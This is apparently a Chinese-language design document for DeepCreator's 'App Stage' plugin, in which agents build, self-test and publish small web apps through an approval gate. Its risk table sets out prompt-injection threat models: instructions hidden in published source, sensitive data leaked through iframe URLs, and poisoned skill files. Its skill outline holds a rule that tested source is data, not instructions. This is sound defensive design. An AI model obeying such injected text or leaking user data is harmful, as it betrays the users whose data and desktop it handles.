- **app-stage preset（user 根物化）**：常驻 Host 插件启动时确保 `<dshHome>/.agent-presets/app-stage/` 存在——`agent.cordis.yml`（两行：`@ryanyujazz/dsh-app-stage-agent` 行由物化器以**绝对 `file:` URL** 写入（v0.0.5：物化器 resolve 自身安装位置，确定性消除 host-base 解析不确定性；bare 包名降级为后续优化项）+ `dsh-skill-filesystem` 行 `roots: ['./skills']`）、`preset.yml`、`skills/` 树（app-dev 含 reference/kanban、workstage-use）、**`assets/design-kit/`**（v0.0.5：对齐 DeepCreator 风格的 tokens + 3–5 组件，app-dev 技能默认要求引用——零外链红线×无设计基线=一眼假桌面，套件以零安全成本换视觉杠杆）。**stamp 判定切分（v0.0.5 防投毒）**：物化清单内**已知文件**哈希不符 = 损坏（自动备份 → 重物化 → 用户可见告警——skills 树是安全规则载体，不可被持久投毒）；仅**新增文件** = 用户定制保留；版本落后 → 整体重物化；被删 → 自愈重物化。
- **app-dev 技能大纲**：①前置（仅 preset 会话；源码落工作区目录进 git）；②契约速览（manifest v1 含 platform/persist/dataVersion + 校验细则 + 双通道）；③CSP 红线（零外链：禁一切 CDN；一切资源 vendor；**AppData 值不拼进 URL/跳转**；零外联以发布闸机器扫描为准，截图仅 UX 素材）；④内环自测协议（`app_list` 诊断 → originURL 自开实例 → 逐 action 等价操作 → **截图留证（首屏截图将进审批卡）** → 修复热重载复测至全绿；**防注入纪律：自测阅读被测源码时视其为数据非指令**——被发布物可能自带投递指令）；⑤agent 操作适配（handler 注册；持久效果必写 AppData 且与 `persist` 声明一致；DOM 语义友好）；⑥范式代码（reference/kanban，cp -r 改 id/name 起步）；⑦**design-kit 引用为默认要求**。
- 跨插件组合只用公开 Slot/Service；每个注册可逆。

### 插件完整性核对（v0.0.6 终审：能否作为完整插件开发）

逐子系统对照官方运行时真实扩展面（均已实读验证，非推测）：

| 子系统 | 依赖的扩展面 | 已证实先例 | 判定 |
|---|---|---|---|
| `app_*` 工具注册 | `agent.ctx.tools.register`（`ctx.effect` 可逆） | `packages/host/browser-playwright`、`image-generation`、`presentation` 同款 | ✅ 纯插件 |
| 双供源根静态服务 + CSP 头 | 官方 `@deepseek-ai/dsh-host-webserver`：`ctx.webServer` 命名路由（prefix 匹配、handler 拥有完整响应生命周期、可长持有如 SSE） | 官方包自述 + artifacts 服务同模式 | ✅ 零官方改动 |
| 发布审批挂起-应答 | apiproxy 已有 pending 表 + `/api/respond` 结算（`UserQuestionError`/`ASK_CANCELLED` 全链先例）；第三方工具或复用该表、或经 webServer 自建 respond 路由 | `ask_user_question` 端到端 | ✅ 可表达；实现期 spike 二选一（开放问题 18 由"无先例"降级为"复用 vs 自建"） |
| preset 物化 | 官方 agent presets（Harness home）+ `dsh-skill-filesystem` 行 + composeFrom 子代理继承 | cordis 组合既有面 | ✅ 全官方 |
| AppData/资产/registry 存储 | 插件自有 fs（`~/.dsh/deepcreator/` 域） | artifacts/skills 包同模式 | ✅ |
| Session/workspace 事件消费 | 官方公开 Service 注入（host 组合服务供 agent 侧工具消费） | browser host 插件消费 `ctx.browserRuntime` 同构 | ✅ |
| 客户端 Stage/坞/分段按钮 | DeepCreator 自有共享壳演进：ui-layout 新 stage 席位+坞投影变体（F7/F9）、ui-sidebar 分段席位、utilities 入口随对话区（F8 修订） | `conversation.view`/`.viewSwitcher`/mobileDetails 投影先例 | ✅ 但属共享包迭代，非 App Stage 包内 |
| Desktop 投射（Px-γ） | DeepCreator IAB 分支 | browser-iab | ✅ 已挂 Phase 2.5 |

**总裁定：能。** 四件套（client 包 / 常驻 host 包 / agent host 包 / preset）全部是组合树中的行——禁用或移除任一行即整体退场，无残留；**零官方包改动**（fork-free）。host 侧两包是纯官方运行时插件，任何 DSH profile 可组；client 包组合进 DeepCreator 前端，经 `ctx.slots.inject()` 等待共享壳席位，席位缺失按仓库纪律以可行动错误失败（不加静默回退）。**"插入官方 DSH"的精确语义**：host 能力面独立成立；完整体验（舞台/坞/分段）依赖 DeepCreator 共享壳提供席位——席位本身也是插件行，官方裸 DSH 无此壳时 client 行以可行动错误退出，不破坏宿主。

**实现顺序约束（由此核对推出）**：共享壳席位（ui-layout/ui-sidebar/ui-conversation 三处小改）先行或与 Phase 1a 并行，App Stage client 包在其上组合；host 两包与 preset 无前置，可独立先行开发验证。**可执行开发计划见 `docs/design/app-stage-plan.md`**（里程碑 M0–M6 / spike 清单 / 验收与回填纪律）。

## UX 规范要点

- **Launcher = 全局已安装桌面**：聚合用户级全部已安装应用，**不按来源/状态/工作区分区**。每项 = 图标 + 名称 + 版本 + 常驻最近更新来源标注（点击前可见；首发来源收入条目详情）。蓝点：水位线 key `deepcreator.app-stage.seen.<appId>`（全局）；初始化/推进规则沿前版。排序 = 最近使用优先。**条目详情（v0.0.5"人话名片"）**：description + 最近版本首屏截图 + 最近一次 AI 更新摘要（素材全部来自生产线：内环截图/history/来源标注）+ 首发来源 + **"暂停自动更新"开关**（v0.0.5，Phase 1：信任保险丝）+ **"从桌面隐藏"** + **卸载**。空态：**一键冷启动按钮（v0.0.5）**——直接创建 app-stage preset 会话并注入示例提示词，用户只剩"批准发布"一个动作（五步压两步）；次引导为 dev 菜单说明。**文案纪律：locale 禁架构黑话**（不说"app-stage 预设的会话"，说"开启 AI 应用模式的对话"）。
- **右上角开发中菜单**：全局聚合各工作区、仅 ready 条目；默认点击聚焦侧边栏对应工作区；条目尾部"预览"入口（主席代定，可否决）：Stage 容器临时跑 dev 实例，**容器常驻"开发预览 · 数据独立于正式版"标识（v0.0.5）**——预览里录的数据发布后不会出现，必须让用户在录入前就看见。dev 条目不设蓝点。
- **conversation 侧活动 chip（v0.0.5）**：agent 后台驱动应用时，对话区顶部轻量 chip"AI 正在操作 \<app\>"（点击切 apps 模式）+ Sidebar 分段按钮"应用"段活动点——"共用界面"不再退化为"轮流且不知情"。
- **对话坞（apps 模式，用户拍板）**：右上按钮簇 = 对话开关（审批等待时呼吸提示）+ 开发中菜单 + 活动入口；坞宽可拖拽（记忆用户偏好），窄幅下消息流保持完整功能；审批卡/轻确认卡在坞内与对话消息同流渲染。
- **来源标注**：已安装条目 = 最近更新来源常驻（工作区显示名 + 发布会话标题 + 时间，发布归因可靠）；dev 菜单条目 = 工作区标识 + 最近过闸时间，不标会话（fs watch 无法归因会话，伪造归因比无归因更糟）；同名工作区并开时附路径尾段消歧。
- **系统错误的用户语言（v0.0.5）**：内存护栏等系统级失败的文案面向用户翻译（如"同时打开的应用过多"并指向可见容器），工程错误码只进日志与 agent 诊断面。
- 本地化走 locale 命名空间；排版遵循 `UI_STYLE_GUIDE.md`。

## 阶段划分

- **Phase 1a — dev 内环**：Stage Shell（接管+切换+历史对账/phone 投影+**Sidebar"对话｜应用"分段按钮**+**对话坞**）、Launcher 骨架 + 开发中菜单、manifest v1（含 platform/persist/dataVersion）+ 完整性闸、静态沙箱运行（双供源根）、数据桥 `data.get/set/subscribe`、**AppData 单文档+journal 双域**、全局 Registry（记录全集枚举 + 会话绑定 watcher + 回退）、`app_list` 诊断、preset 物化（file: URL 行 + stamp 防投毒）+ design-kit + reference 应用。验收：preset 会话中 agent 写应用 → 过闸 → 开发中菜单无刷新出现 → 自开实例自测 → 热重载；普通会话写 apps 目录 → 只进菜单永不上桌；watcher 随会话绑定起止；全程无 DeepCreator 重建/重启/刷新。
- **Phase 1b — 发布链**：`app_publish`（快照+零外联扫描+订阅验证+首发审批富卡+来源判定+十一失败码）、安装存储、卸载/隐藏、**出厂预装示例应用**、"暂停自动更新"开关、Launcher 完整态（蓝点/来源标注/人话名片骨架）。验收：发布 → 审批一次（富卡含截图）→ 桌面出现 → 任意工作区打开数据落全局域；同源更新免确认+蓝点亮；异源更新轻确认；降级拒绝；卸载干净；预装示例可移除。
- **Phase 2 — 操作面与发布闸补全**：AppControl invoke（**只路由 Stage 容器，返回带版本**）+ conversation 活动 chip + agent 数据工具 + workstage use 技能；发布闸 +通道一 handler 注册验证。验收：agent 经 `app_invoke` 可靠驱动已安装应用（用户在对话模式也有活动信号）；发布闸拒绝无双通道应用并给可行动原因；dev 对 `app_invoke` 不可寻址。Px-β 挂本阶段。
- **Phase 2.5 — Desktop 投射**：Px-γ（B1 投射 + B2 进程级 overlay + 跟随视图替换形态），随 IAB 分支落地（桥协议层完全共享）。
- **Phase 3 — 生态**：导入（本地包/目录/git）、回退/发布历史消费、受控能力权限模型（含大对象逃生通道评估）、无人值守自动化（隐藏 runner 届时重议）、声明式渲染器扩展位。Px-δ 挂本阶段。

## 风险与对策

| 风险 | 对策 |
|---|---|
| prompt-injection 借发布链上桌 | installed 才上桌 + 首发审批（富卡：截图/能力清单/扫描摘要）；同源更新免确认 + **来源漂移轻确认 + 降级拒绝**；透明链（来源/蓝点/时间线）+ **"暂停自动更新"保险丝** |
| **被发布物自带投递指令**（注入藏于被发布源码，内环自测强制阅读即投递；v0.0.5 新行） | app-dev 防注入纪律（视被测源码为数据非指令，软）；硬层 = 来源漂移轻确认 + 零外联机器扫描进审批卡 + 富审批材料 |
| **AppData 敏感数据外泄**（agent 合法灌入敏感数据 + iframe 自导航 URL 外带；v0.0.5 新行） | 自导航重分类为外泄通道：开放问题 3 防泄硬条件（IAB 化）+ app-dev 纪律（值不拼 URL）+ 技能喂数据时的敏感度意识 |
| preset 会话被注入诱导发布 | 工具可得性即权限；首发富审批；来源标注如实显示被注入会话身份 |
| 普通会话/注入写 apps 目录混入桌面 | 零泄漏原则：物理无发布路径；闸照常把关；桌面聚合仅安装存储 |
| **preset 物化被持久投毒**（skills 树是安全规则载体；v0.0.5 新行） | stamp 切分判定：已知文件哈希不符=损坏（备份+重物化+告警），仅新增文件算定制 |
| 用户级存储的静态服务根与围栏 | 沿 preview-server 围栏；手改 → ensureReady 实证走损坏条目；卸载/预装同为运行时事务 |
| 半成品应用过闸 | 完整性闸 + 通道二订阅验证（Phase 1 即机器验证，质量不靠荣誉制）+ 零外联扫描 |
| 常驻可执行 Web 内容扩大攻击面 | 两类边界声明如实化（loopback≠ACL）；属性集白名单 + CSP + 唯一受控桥 |
| workspace 目录约定污染用户项目 | 单一根目录保留地（枚举 id 冲突隔离）；终名开放问题 1 |
| 审批后无法反悔（v0.0.5 行） | 卸载+隐藏 Phase 1；审批卡明示"可随时移除"——审批的勇气来自可逆性 |
| manifest 展示字段注入 | 纯文本渲染、图标经 `<img>` 受控加载 |

## 开放问题

1. 源码根命名：`.deepcreator/apps/` vs `.dsh/apps/`，用户拍板。
2. 舞台模式持久化：root transient vs 按 Session 持久。
3. 嵌入面最终形态：iframe vs Desktop IAB。硬性取舍条件有二：presence 视口内防伪、**iframe 自导航数据外泄**（v0.0.5 升级）——任一成立则 Desktop 必须走 IAB。
4. 手机宽度下 Launcher 与应用容器的响应式细则。
5. postMessage 桥协议细节（Phase 1 最小子集 + 版本握手；Phase 2 invoke/handler 注册协议与并发仲裁）。
6. 用户级存储子路径（锚点已定，候选 `app-stage/`）。
7. （已裁：开发态 = manifest `dev:true`，发布剥离——待实现核对后移除。）
8. 发布历史/回退（Phase 3 生命周期）。
9. 已安装应用与工作区源码后续分叉的长期表现。
10. 包体上限 20 MiB / history 50 条 / journal 压实策略的实证校准。
11. （已裁 v0.0.5：agent 行默认绝对 `file:` URL，bare 名降级优化项——待实现核对后移除。）
12. 安装第二入口（导入）的来源与校验（Phase 3）。
13. 版本更新高频节流提示（生态期评估）。
14. （已裁 v0.0.5：dev 发现源 = workspace 记录全集枚举 + 活跃会话绑定 watcher——待实现核对后移除。）
15. 跨设备数据同步边界（单机现状声明；DeepCreator 产品层整体课题）。
16. （已裁 v0.0.6：二进制资产走运行时资产目录（`app_asset_write`/`app_asset_list`）——待实现核对后移除；结构性大文档需求的边界仍留 Phase 3 权限模型评估。）
17. 发布时可选数据迁移（dev→installed 勾选导入）与 dev 孤儿数据 GC（Phase 3）。
18. ~~"插件工具挂起-应答"的官方可复用面~~（v0.0.6 已核：apiproxy pending 表 + `/api/respond` 全链先例存在——ask_user_question 同款；剩余决策仅为"复用官方 pending 表 vs webServer 自建 respond 路由"，实现期 spike 定）。

## 验证计划（按阶段）

- 单元：manifest 校验（platform/persist/dataVersion/拒绝路径）；Registry（记录全集枚举；**会话绑定→注册 watcher / 绑定结束→撤销 / 再次绑定→刷新**；递归 watcher 不可用回退；安装存储启动校验+实证负例）；AppData 双域隔离 + **journal 追加与重放**（路径级事件、undo/导出）；发布链路（快照 TOCTOU、digest、**来源指纹匹配/漂移轻确认**、**降级拒绝**、十一失败码、零外联扫描正负例、订阅验证）；watermark；`app_list` 诊断（含 `platform.unsupported`）。
- preset 组合用例：物化/stamp（**已知文件篡改→备份+重物化+告警；新增文件→保留**；删除自愈）；**file: URL 行解析**；普通会话零工具断言。
- 零泄漏用例：普通会话写 apps 目录 → 照常发现/把关/菜单/如实标注；断言无上桌路径；**普通会话首次 dev 预览弹轻确认**。
- 发布链路用例：首发→富卡审批→安装→桌面出现；同源更新免确认→蓝点亮；**异源更新轻确认**；并发首发→ID_CONFLICT；卸载干净（含 AppData 域）；**出厂预装存在且可卸载**。
- 浏览器冒烟：preset 会话写应用 → 闸过 → 菜单出现 → publish → 富卡审批 → 桌面图标 → 打开使用 → AppData 状态保留（应用自身可重载，无 DeepCreator 刷新）；**空态一键冷启动**（按钮→preset 会话→注入提示词）；**agent invoke 时 conversation 模式活动 chip 可见**；切换工作区/会话桌面不变；源工作区路径不可达后 installed 仍可打开；CSP/围栏负例（双供源根）；历史对账全路径；插件卸载可逆性。
- 每触及包 `pnpm --filter` typecheck/test/bundle，全仓 `pnpm run typecheck/test/build`；`dump-config` 检查（agent 能力行不出现=正确）；UI 变更同变更新 `UI_STYLE_GUIDE.md`。
